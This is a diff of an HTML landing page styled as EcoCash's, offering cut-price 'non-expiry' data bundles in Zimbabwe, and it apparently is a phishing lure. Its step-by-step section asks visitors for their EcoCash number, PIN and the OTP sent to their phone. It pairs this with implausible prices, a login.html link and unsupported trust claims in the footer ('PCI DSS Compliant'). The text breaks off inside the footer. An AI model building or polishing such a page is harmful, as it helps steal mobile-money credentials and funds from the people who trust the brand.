@@ -2,425 +2,228 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>EcoCash | Data Bundles · Zimbabwe</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash | Non-Expiry Data Bundles · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            /* Primary Colors - Red and Blue */
-            --primary-red: #d32f2f;
-            --primary-red-dark: #b71c1c;
-            --primary-blue: #1565c0;
-            --primary-blue-dark: #0d47a1;
-            --primary-blue-light: #1976d2;
-            
-            /* Accent Colors */
-            --accent-green: #00b050;
-            --accent-green-dark: #007d38;
-            
-            /* Neutral Colors - White and Bluish */
+            --primary-blue: #0052cc;
+            --primary-blue-dark: #003d99;
+            --primary-blue-light: #1a73e8;
+            --accent-red: #d32f2f;
             --white: #ffffff;
-            --bluish-light: #e3f2fd;
-            --bluish-medium: #bbdefb;
-            --bluish-dark: #1e3a8a;
-            
-            /* Background Colors */
-            --page: #0a1428;
-            --surface: #1a2332;
-            --surface2: #243447;
-            --border: rgba(255,255,255,0.08);
-            --border2: rgba(255,255,255,0.15);
-            
-            /* Text Colors */
-            --text: #ffffff;
-            --text2: #d0d9e8;
-            --muted: #8fa3b8;
+            --light-bg: #f8f9fa;
+            --text-dark: #1a1a1a;
+            --text-muted: #666666;
+            --border: #e0e0e0;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html { -webkit-text-size-adjust: 100%; }
 
         body {
-            min-height: 100dvh;
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            color: var(--text);
-            background: linear-gradient(135deg, var(--page) 0%, var(--surface) 100%);
-            overflow-x: hidden;
+            background: var(--white);
+            color: var(--text-dark);
+            line-height: 1.6;
         }
-
-        /* Sticky Ticker */
-        .ticker-wrap {
-            background: #000814;
-            color: var(--text2);
-            padding: 11px 0;
-            overflow: hidden;
-            white-space: nowrap;
-            border-bottom: 2px solid var(--primary-red);
-            position: sticky;
-            top: 0;
-            z-index: 1100;
-        }
-
-        .ticker-inner {
-            display: inline-flex;
-            animation: ticker 40s linear infinite;
-        }
-
-        .ticker-inner span {
-            margin-right: 70px;
-            font-size: 12.5px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 600;
-        }
-
-        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
 
         /* Header */
         header {
-            background: rgba(10, 20, 40, 0.97);
-            backdrop-filter: blur(12px);
-            border-bottom: 2px solid rgba(21, 101, 192, 0.4);
-            position: sticky;
-            top: 52px;
-            z-index: 1000;
-            box-shadow: 0 4px 24px rgba(0,0,0,.5);
-        }
-
-        .nav-content {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 5%;
-            height: 72px;
+            background: var(--white);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 5%;
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            gap: 14px;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
 
         .logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary-blue);
             text-decoration: none;
-            flex-shrink: 0;
-        }
-
-        .logo-icon {
-            width: 44px;
-            height: 44px;
-            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 8px 32px rgba(211, 47, 47, 0.4);
-            flex-shrink: 0;
-        }
-
-        .logo-icon span {
-            color: var(--white);
-            font-weight: 900;
-            font-size: 18px;
-            letter-spacing: -1px;
-        }
-
-        .logo-name {
-            font-size: 1.5rem;
-            font-weight: 900;
-            color: var(--text);
             letter-spacing: -0.5px;
-            line-height: 1;
-            white-space: nowrap;
         }
 
-        .logo-name em { 
-            font-style: normal; 
-            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .logo-sub {
-            font-size: 9px;
-            color: var(--muted);
-            font-weight: 700;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            display: block;
-            margin-top: 2px;
-            white-space: nowrap;
-        }
-
-        .live-pill {
-            background: rgba(211, 47, 47, 0.15);
-            border: 1px solid rgba(211, 47, 47, 0.35);
-            color: var(--primary-red);
-            font-size: 10.5px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            padding: 5px 13px;
-            border-radius: 20px;
+        nav {
             display: flex;
+            gap: 30px;
             align-items: center;
-            gap: 6px;
-            flex-shrink: 0;
         }
 
-        .live-dot {
-            width: 6px;
-            height: 6px;
-            background: var(--primary-red);
-            border-radius: 50%;
-            animation: blink 1.4s infinite;
-        }
-
-        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
-
-        .nav-links {
-            display: flex;
-            gap: 24px;
+        nav a {
+            color: var(--text-dark);
+            text-decoration: none;
             font-weight: 600;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        nav a:hover {
+            color: var(--primary-blue);
+        }
+
+        .btn-login {
+            background: var(--primary-blue);
+            color: white;
+            padding: 10px 24px;
+            border-radius: 50px;
+            border: none;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
             font-size: 14px;
         }
 
-        .nav-links a {
-            color: var(--text2);
-            text-decoration: none;
-            transition: 0.22s ease;
-            padding: 6px 0;
-            border-bottom: 2px solid transparent;
+        .btn-login:hover {
+            background: var(--primary-blue-dark);
         }
 
-        .nav-links a:hover {
-            color: var(--text);
-            border-bottom-color: var(--primary-blue-light);
-        }
-
-        .login-btn {
-            background: linear-gradient(135deg, var(--primary-blue), var(--primary-blue-dark));
-            color: white;
-            padding: 10px 26px;
-            border-radius: 50px;
-            font-weight: 700;
-            text-decoration: none;
-            transition: 0.22s ease;
-            font-size: 13px;
-            box-shadow: 0 8px 32px rgba(21, 101, 192, 0.4);
-            flex-shrink: 0;
-            border: none;
-            cursor: pointer;
-        }
-
-        .login-btn:hover { transform: scale(1.04); }
-
-        /* Hero */
+        /* Hero Section */
         .hero {
-            background: linear-gradient(160deg, var(--primary-blue-dark) 0%, var(--primary-blue) 55%, #1565c0 100%);
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--primary-blue-dark) 100%);
             color: white;
-            padding: clamp(64px, 13vw, 140px) 5% clamp(56px, 10vw, 100px);
+            padding: 80px 5%;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-        }
-
-        .hero::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background-image: radial-gradient(circle at 70% 30%, rgba(211, 47, 47, 0.12) 0%, transparent 55%);
-            pointer-events: none;
-        }
-
-        .hero-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(211, 47, 47, 0.18);
-            border: 1px solid rgba(211, 47, 47, 0.40);
-            color: var(--primary-red);
-            font-size: 11px;
-            font-weight: 700;
-            padding: 7px 18px;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            border-radius: 999px;
-            margin-bottom: 22px;
         }
 
         .hero h1 {
-            font-size: clamp(2.1rem, 7.5vw, 4.2rem);
+            font-size: 3.5rem;
             font-weight: 900;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             letter-spacing: -1.5px;
-            line-height: 1.08;
-        }
-
-        .hero h1 em { 
-            font-style: normal; 
-            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            line-height: 1.1;
         }
 
         .hero p {
-            font-size: clamp(.95rem, 2.4vw, 1.15rem);
-            max-width: 640px;
-            margin: 0 auto 36px;
-            color: rgba(255,255,255,.8);
-            line-height: 1.75;
-            padding: 0 6px;
+            font-size: 1.25rem;
+            opacity: 0.95;
+            max-width: 600px;
+            margin: 0 auto 40px;
+            font-weight: 500;
         }
 
-        .hero-cta {
+        .btn-explore {
             display: inline-block;
-            background: linear-gradient(135deg, var(--primary-red), var(--primary-red-dark));
-            color: white;
-            padding: 17px 56px;
+            background: white;
+            color: var(--primary-blue);
+            padding: 14px 32px;
             border-radius: 50px;
-            font-weight: 800;
             text-decoration: none;
-            font-size: 1.05rem;
-            letter-spacing: .3px;
-            box-shadow: 0 8px 32px rgba(211, 47, 47, .45);
-            transition: 0.22s ease;
-            border: none;
-            cursor: pointer;
+            font-weight: 800;
+            font-size: 16px;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
 
-        .hero-cta:hover { transform: translateY(-3px); box-shadow: 0 12px 40px rgba(211, 47, 47, .5); }
+        .btn-explore:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0,0,0,0.2);
+        }
 
-        /* Sections */
-        .section { padding: clamp(56px, 9vw, 90px) 5%; position: relative; z-index: 1; }
+        /* Bundles Section */
+        .bundles-section {
+            padding: 60px 5%;
+            background: var(--light-bg);
+        }
 
         .section-label {
-            color: var(--primary-red);
-            font-weight: 700;
             text-align: center;
-            letter-spacing: 3px;
-            font-size: .9rem;
+            color: var(--accent-red);
+            font-weight: 800;
+            font-size: 12px;
             text-transform: uppercase;
-            display: block;
-            margin-bottom: 12px;
+            letter-spacing: 0.1em;
+            margin-bottom: 16px;
         }
 
         .section-title {
             text-align: center;
-            font-size: clamp(1.7rem, 5.5vw, 2.7rem);
+            font-size: 2.5rem;
             font-weight: 900;
             margin-bottom: 16px;
-            letter-spacing: -.8px;
-            color: var(--text);
+            color: var(--text-dark);
+            letter-spacing: -0.8px;
         }
 
-        .section-sub {
+        .section-subtitle {
             text-align: center;
-            max-width: 800px;
-            margin: 0 auto 50px;
-            color: var(--muted);
-            font-size: 1rem;
-            line-height: 1.75;
-            padding: 0 6px;
+            color: var(--text-muted);
+            font-size: 1.1rem;
+            margin-bottom: 50px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .bundles-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 28px;
-            max-width: 1400px;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+            max-width: 1200px;
             margin: 0 auto;
         }
 
         .bundle-card {
-            background: var(--surface);
-            border-radius: 24px;
-            border: 1px solid var(--border2);
-            overflow: hidden;
-            box-shadow: 0 16px 60px rgba(0,0,0,.4);
-            transition: all 0.4s ease;
-            position: relative;
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 28px;
+            text-align: center;
+            transition: all 0.3s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
 
         .bundle-card:hover {
-            transform: translateY(-12px);
-            border-color: var(--primary-blue-light);
-            box-shadow: 0 20px 60px rgba(21, 101, 192, 0.25);
+            border-color: var(--primary-blue);
+            box-shadow: 0 8px 24px rgba(0,82,204,0.15);
+            transform: translateY(-4px);
         }
 
-        .bcard-head {
-            background: linear-gradient(135deg, var(--primary-blue), var(--primary-blue-dark));
-            padding: 24px 28px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 14px;
-            flex-wrap: wrap;
+        .bundle-card.popular {
+            border: 2px solid var(--primary-blue);
+            background: linear-gradient(135deg, rgba(26, 115, 232, 0.05) 0%, rgba(0, 82, 204, 0.03) 100%);
         }
 
-        .bcard-head-left { min-width: 0; }
-
-        .bcard-head-left h2 {
-            font-size: 1.5rem;
-            font-weight: 900;
-            color: white;
-            margin: 0;
-        }
-
-        .bcard-head-left p {
-            font-size: 12px;
-            color: rgba(255,255,255,.75);
-            margin-top: 3px;
-            font-weight: 500;
-        }
-
-        .bcard-price-wrap { text-align: right; }
-
-        .bcard-price-label {
-            font-size: 10px;
-            color: rgba(255,255,255,.65);
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 3px;
-        }
-
-        .bcard-price {
-            font-size: 2.6rem;
-            font-weight: 900;
-            color: white;
-            letter-spacing: -1px;
-            line-height: 1;
-        }
-
-        .bcard-price span {
-            font-size: 1rem;
-            vertical-align: super;
-            font-weight: 700;
-            margin-right: 2px;
-        }
-
-        .best-badge {
+        .bundle-badge {
             display: inline-block;
-            background: var(--primary-red);
-            color: var(--white);
-            font-size: 10px;
+            background: var(--accent-red);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 50px;
+            font-size: 11px;
             font-weight: 800;
-            padding: 3px 10px;
-            border-radius: 999px;
-            margin-top: 6px;
-            letter-spacing: .5px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 16px;
         }
 
-        .bcard-body { padding: 28px; }
+        .bundle-data {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: var(--primary-blue);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .bundle-price {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+        }
 
         .bundle-features {
+            list-style: none;
             text-align: left;
-            margin: 20px 0;
-            font-size: 1rem;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: var(--text-muted);
         }
 
         .bundle-features li {
@@ -428,368 +231,334 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            color: var(--text2);
         }
 
         .bundle-features li::before {
             content: "✓";
-            color: var(--primary-red);
+            color: var(--primary-blue);
             font-weight: 800;
+            font-size: 18px;
         }
 
-        .bundle-btn {
+        .btn-bundle {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, var(--primary-red), var(--primary-red-dark));
+            background: var(--primary-blue);
             color: white;
             border: none;
+            padding: 14px 20px;
             border-radius: 50px;
-            font-weight: 700;
-            font-size: 1.05rem;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 4px 18px rgba(211, 47, 47, .4);
-        }
-
-        .bundle-btn:hover {
-            background: linear-gradient(135deg, var(--primary-red-dark), #8b0000);
-            transform: scale(1.03);
-            box-shadow: 0 8px 28px rgba(211, 47, 47, .5);
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            padding: 20px;
-            backdrop-filter: blur(4px);
-        }
-
-        .modal.active { display: flex; }
-
-        .modal-content {
-            background: var(--surface);
-            border: 1px solid var(--border2);
-            border-radius: 24px;
-            padding: 32px;
-            max-width: 450px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .modal-content::before {
-            content: "";
-            position: absolute;
-            inset: 0 0 auto 0;
-            height: 6px;
-            background: linear-gradient(90deg, var(--primary-red), var(--primary-blue));
-        }
-
-        .modal-title {
-            font-size: 24px;
             font-weight: 800;
-            letter-spacing: -0.8px;
-            margin-bottom: 8px;
-            color: white;
-        }
-
-        .modal-subtitle {
-            font-size: 13px;
-            color: var(--muted);
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .modal-summary {
-            background: linear-gradient(160deg, var(--primary-blue-dark) 0%, var(--primary-blue) 100%);
-            border-radius: 16px;
-            padding: 16px 18px;
-            margin-bottom: 20px;
-            color: #fff;
-        }
-
-        .ms-title {
-            font-size: 10px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            color: rgba(255,255,255,0.55);
-            margin-bottom: 10px;
-        }
-
-        .ms-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin-bottom: 10px;
-        }
-
-        .ms-item {
-            background: rgba(255,255,255,0.10);
-            border-radius: 10px;
-            padding: 9px 12px;
-        }
-
-        .ms-item-label {
-            font-size: 10px;
-            color: rgba(255,255,255,0.55);
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        .ms-item-val {
-            font-size: 15px;
-            font-weight: 800;
-            color: #fff;
-            margin-top: 2px;
-            letter-spacing: -0.3px;
-        }
-
-        .ms-total {
-            background: rgba(211, 47, 47, 0.18);
-            border: 1px solid rgba(211, 47, 47, 0.35);
-            border-radius: 10px;
-            padding: 10px 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .ms-total-label { font-size: 12px; color: rgba(255,255,255,0.7); font-weight: 600; }
-        .ms-total-val   { font-size: 1.25rem; font-weight: 900; color: #ff6b6b; letter-spacing: -0.5px; }
-
-        .modal-buttons {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .btn-confirm {
-            flex: 1;
-            border: 0;
-            border-radius: 999px;
-            padding: 14px 16px;
-            background: linear-gradient(135deg, var(--primary-red), var(--primary-red-dark));
-            color: white;
             font-size: 14px;
-            font-weight: 800;
             text-transform: uppercase;
             letter-spacing: 0.04em;
             cursor: pointer;
-            box-shadow: 0 8px 20px rgba(211, 47, 47, 0.25);
             transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(0,82,204,0.2);
         }
 
-        .btn-confirm:hover:not(:disabled) {
-            box-shadow: 0 12px 28px rgba(211, 47, 47, 0.35);
+        .btn-bundle:hover {
+            background: var(--primary-blue-dark);
             transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(0,82,204,0.3);
         }
 
-        .btn-confirm:disabled {
-            background: #555;
-            cursor: not-allowed;
+        /* Why Us Section */
+        .why-us {
+            padding: 60px 5%;
+            background: white;
         }
 
-        .btn-cancel {
-            flex: 1;
-            border: 1.5px solid var(--border2);
-            border-radius: 999px;
-            padding: 14px 16px;
-            background: transparent;
-            color: var(--text2);
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
+        .why-us-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
         }
 
-        .btn-cancel:hover {
-            background: var(--surface2);
-            border-color: var(--primary-blue-light);
-            color: var(--text);
+        .why-card {
+            text-align: center;
+        }
+
+        .why-icon {
+            font-size: 3rem;
+            margin-bottom: 16px;
+        }
+
+        .why-card h3 {
+            font-size: 1.25rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: var(--text-dark);
+        }
+
+        .why-card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        /* Steps Section */
+        .steps-section {
+            padding: 60px 5%;
+            background: var(--light-bg);
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 30px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .step-card {
+            background: white;
+            padding: 32px 24px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            border: 1px solid var(--border);
+        }
+
+        .step-number {
+            width: 48px;
+            height: 48px;
+            background: var(--primary-blue);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 24px;
+            margin: 0 auto 16px;
+        }
+
+        .step-card h3 {
+            font-size: 1.1rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: var(--text-dark);
+        }
+
+        .step-card p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--text-dark);
+            color: white;
+            padding: 40px 5%;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: rgba(255,255,255,0.7);
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
         }
 
         @media (max-width: 768px) {
-            .nav-links { display: none; }
+            nav { display: none; }
+            .hero h1 { font-size: 2.2rem; }
+            .hero p { font-size: 1rem; }
+            .section-title { font-size: 1.8rem; }
             .bundles-grid { grid-template-columns: 1fr; }
+            .why-us-grid { gap: 24px; }
+            .steps-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
-    <div class="ticker-wrap">
-        <div class="ticker-inner">
-            <span>🎉 Limited Time: Get 50GB Non-Expiry Data for just $9.99!</span>
-            <span>📱 Fast & Secure: Instant activation on your EcoCash account</span>
-            <span>🌍 Zimbabwe's #1 Data Provider: Trusted by millions</span>
-            <span>🎉 Limited Time: Get 50GB Non-Expiry Data for just $9.99!</span>
-        </div>
-    </div>
-
     <header>
-        <div class="nav-content">
-            <a href="#" class="logo">
-                <div class="logo-icon"><span>E</span></div>
-                <div>
-                    <div class="logo-name">Eco<em>Cash</em></div>
-                    <div class="logo-sub">Data Bundles</div>
-                </div>
-            </a>
-            <nav class="nav-links">
-                <a href="#bundles">Bundles</a>
-                <a href="#features">Features</a>
-                <a href="#faq">FAQ</a>
-            </nav>
-            <button class="login-btn">Get Started</button>
-        </div>
+        <a class="logo" href="index.html">EcoCash</a>
+        <nav>
+            <a href="#bundles">Bundles</a>
+            <a href="#why">Why Us</a>
+            <a href="#faq">FAQ</a>
+            <button class="btn-login" onclick="window.location.href='login.html'">Login</button>
+        </nav>
     </header>
 
     <section class="hero">
-        <div class="hero-badge">
-            <span>⚡ LIVE DEALS</span>
-        </div>
-        <h1>Unlimited <em>Data</em> for Your Mobile</h1>
-        <p>Experience blazing-fast internet with our non-expiry data bundles. No throttling, no hidden charges—just pure connectivity.</p>
-        <button class="hero-cta" onclick="document.getElementById('bundlesSection').scrollIntoView({behavior: 'smooth'})">Explore Bundles</button>
+        <h1>Data That Never Expires</h1>
+        <p>Zimbabwe's fastest & most reliable non-expiry data bundles. Buy once. Use anytime.</p>
+        <a href="#bundles" class="btn-explore">🛒 Explore Bundles</a>
     </section>
 
-    <section class="section" id="bundlesSection">
-        <span class="section-label">Premium Offerings</span>
-        <h2 class="section-title">Choose Your Perfect <em>Data Bundle</em></h2>
-        <p class="section-sub">Select from our curated collection of high-speed data bundles designed for every need and budget.</p>
+    <section class="bundles-section" id="bundles">
+        <div class="section-label">Choose Your Plan</div>
+        <h2 class="section-title">Non-Expiry Data Bundles</h2>
+        <p class="section-subtitle">All bundles include double data. Active all days. Never expires.</p>
 
         <div class="bundles-grid">
-            <!-- Bundle 1 -->
             <div class="bundle-card">
-                <div class="bcard-head">
-                    <div class="bcard-head-left">
-                        <h2>Starter</h2>
-                        <p>Perfect for light users</p>
-                    </div>
-                    <div class="bcard-price-wrap">
-                        <div class="bcard-price-label">From</div>
-                        <div class="bcard-price"><span>$</span>4.99</div>
-                    </div>
-                </div>
-                <div class="bcard-body">
-                    <ul class="bundle-features">
-                        <li>5GB Data</li>
-                        <li>Non-Expiry</li>
-                        <li>Instant Activation</li>
-                        <li>24/7 Support</li>
-                    </ul>
-                    <button class="bundle-btn" onclick="selectBundle('Starter', '5GB', '4.99')">Select Plan</button>
-                </div>
+                <div class="bundle-data">4 GB</div>
+                <div class="bundle-price">USD 0.60</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('4 GB', '0.60')">Get This Bundle</button>
             </div>
 
-            <!-- Bundle 2 -->
             <div class="bundle-card">
-                <div class="bcard-head">
-                    <div class="bcard-head-left">
-                        <h2>Professional</h2>
-                        <p>Most popular choice</p>
-                    </div>
-                    <div class="bcard-price-wrap">
-                        <div class="bcard-price-label">From</div>
-                        <div class="bcard-price"><span>$</span>9.99</div>
-                    </div>
-                </div>
-                <div class="bcard-body">
-                    <div class="best-badge">BEST VALUE</div>
-                    <ul class="bundle-features">
-                        <li>50GB Data</li>
-                        <li>Non-Expiry</li>
-                        <li>Priority Support</li>
-                        <li>Rollover Data</li>
-                    </ul>
-                    <button class="bundle-btn" onclick="selectBundle('Professional', '50GB', '9.99')">Select Plan</button>
-                </div>
+                <div class="bundle-data">10 GB</div>
+                <div class="bundle-price">USD 1.40</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('10 GB', '1.40')">Get This Bundle</button>
             </div>
 
-            <!-- Bundle 3 -->
             <div class="bundle-card">
-                <div class="bcard-head">
-                    <div class="bcard-head-left">
-                        <h2>Enterprise</h2>
-                        <p>For power users</p>
-                    </div>
-                    <div class="bcard-price-wrap">
-                        <div class="bcard-price-label">From</div>
-                        <div class="bcard-price"><span>$</span>19.99</div>
-                    </div>
-                </div>
-                <div class="bcard-body">
-                    <ul class="bundle-features">
-                        <li>200GB Data</li>
-                        <li>Non-Expiry</li>
-                        <li>VIP Support</li>
-                        <li>Unlimited Rollover</li>
-                    </ul>
-                    <button class="bundle-btn" onclick="selectBundle('Enterprise', '200GB', '19.99')">Select Plan</button>
-                </div>
+                <div class="bundle-data">20 GB</div>
+                <div class="bundle-price">USD 2.80</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('20 GB', '2.80')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card popular">
+                <div class="bundle-badge">Most Popular</div>
+                <div class="bundle-data">50 GB</div>
+                <div class="bundle-price">USD 5.20</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('50 GB', '5.20')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card">
+                <div class="bundle-data">100 GB</div>
+                <div class="bundle-price">USD 9.90</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('100 GB', '9.90')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card">
+                <div class="bundle-badge">Best Value</div>
+                <div class="bundle-data">200 GB</div>
+                <div class="bundle-price">USD 19.80</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('200 GB', '19.80')">Get This Bundle</button>
             </div>
         </div>
     </section>
 
-    <!-- Selection Modal -->
-    <div id="bundleModal" class="modal">
-        <div class="modal-content">
-            <h3 class="modal-title">Confirm Your Bundle</h3>
-            <p class="modal-subtitle">Review your selection before proceeding to payment.</p>
-
-            <div class="modal-summary">
-                <div class="ms-title">Your Selection</div>
-                <div class="ms-grid">
-                    <div class="ms-item"><div class="ms-item-label">Bundle</div><div class="ms-item-val" id="modalOffer">—</div></div>
-                    <div class="ms-item"><div class="ms-item-label">Data</div><div class="ms-item-val" id="modalData">—</div></div>
-                </div>
-                <div class="ms-total">
-                    <span class="ms-total-label">Total Price</span>
-                    <span class="ms-total-val" id="modalPrice">$ —</span>
-                </div>
+    <section class="why-us" id="why">
+        <h2 class="section-title">Why Choose EcoCash?</h2>
+        <div class="why-us-grid">
+            <div class="why-card">
+                <div class="why-icon">♾️</div>
+                <h3>Never Expires</h3>
+                <p>Your data stays valid until you use it. No time pressure.</p>
             </div>
-
-            <div class="modal-buttons">
-                <button class="btn-confirm" onclick="proceedToPayment()">Proceed to Payment</button>
-                <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+            <div class="why-card">
+                <div class="why-icon">⚡</div>
+                <h3>Instant Activation</h3>
+                <p>Buy and start browsing immediately. No waiting.</p>
+            </div>
+            <div class="why-card">
+                <div class="why-icon">🔄</div>
+                <h3>Automatic Rollover</h3>
+                <p>Unused data carries forward forever. Nothing wasted.</p>
+            </div>
+            <div class="why-card">
+                <div class="why-icon">🌐</div>
+                <h3>Nationwide Coverage</h3>
+                <p>Reliable 4G/5G across Zimbabwe. Always connected.</p>
             </div>
         </div>
-    </div>
+    </section>
+
+    <section class="steps-section">
+        <h2 class="section-title">How to Get Started</h2>
+        <div class="steps-grid">
+            <div class="step-card">
+                <div class="step-number">1</div>
+                <h3>Choose Bundle</h3>
+                <p>Select your preferred data bundle from our range.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">2</div>
+                <h3>Enter Details</h3>
+                <p>Provide your EcoCash number and PIN for verification.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">3</div>
+                <h3>Verify OTP</h3>
+                <p>Enter the code sent to your phone to confirm.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">4</div>
+                <h3>Enjoy Data</h3>
+                <p>Your bundle is activated instantly. Start browsing!</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Contact Us</a>
+            <a href="#">Support</a>
+        </div>
+        <div class="footer-bottom">
+            © 2026 Econet Wireless · EcoCash. All rights reserved. | 256-bit Encrypted | PCI DSS Compliant
